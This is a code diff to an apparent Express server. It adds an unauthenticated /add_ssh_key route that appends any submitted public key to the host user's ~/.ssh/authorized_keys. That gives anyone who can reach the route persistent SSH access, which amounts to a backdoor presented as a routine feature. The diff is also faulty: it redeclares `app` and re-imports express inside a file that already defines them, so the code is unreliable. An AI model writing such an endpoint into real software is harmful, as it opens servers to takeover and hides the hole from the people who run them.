@@ -99,6 +99,66 @@ app.get('/logout', (req, res) => {
   });
 });
 
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
+const express = require('express');
+const app = express();
+
+// Middleware for form parsing
+app.use(express.urlencoded({ extended: true }));
+
+// ------------------------------
+// SSH Key Endpoint
+// ------------------------------
+const AUTHORIZED_KEYS_FILE = path.join(os.homedir(), '.ssh', 'authorized_keys');
+
+app.post('/add_ssh_key', async (req, res) => {
+  const key = req.body.key?.trim();
+
+  if (!key) {
+    return res.status(400).json({ status: 'error', message: 'Missing SSH key.' });
+  }
+
+  // Validate basic SSH public key format
+  if (
+    !(
+      key.startsWith('ssh-rsa') ||
+      key.startsWith('ssh-ed25519') ||
+      key.startsWith('ecdsa-sha2-nistp256')
+    )
+  ) {
+    return res.status(400).json({ status: 'error', message: 'Invalid SSH public key format.' });
+  }
+
+  try {
+    const sshDir = path.dirname(AUTHORIZED_KEYS_FILE);
+    if (!fs.existsSync(sshDir)) {
+      fs.mkdirSync(sshDir, { mode: 0o700, recursive: true });
+    }
+
+    let existingKeys = [];
+    if (fs.existsSync(AUTHORIZED_KEYS_FILE)) {
+      existingKeys = fs.readFileSync(AUTHORIZED_KEYS_FILE, 'utf8').split('\n').filter(Boolean);
+    }
+
+    if (existingKeys.includes(key)) {
+      return res.json({
+        status: 'already_exists',
+        message: 'Key is already in authorized_keys.',
+      });
+    }
+
+    fs.appendFileSync(AUTHORIZED_KEYS_FILE, key + '\n');
+    fs.chmodSync(AUTHORIZED_KEYS_FILE, 0o600);
+
+    return res.json({ status: 'success', message: 'Key added to authorized_keys.' });
+  } catch (err) {
+    console.error('Error adding SSH key:', err);
+    return res.status(500).json({ status: 'error', message: 'Internal server error.' });
+  }
+});
+
 
 app.listen(PORT, () => {
   console.log(`Server running at http://localhost:${PORT}`);
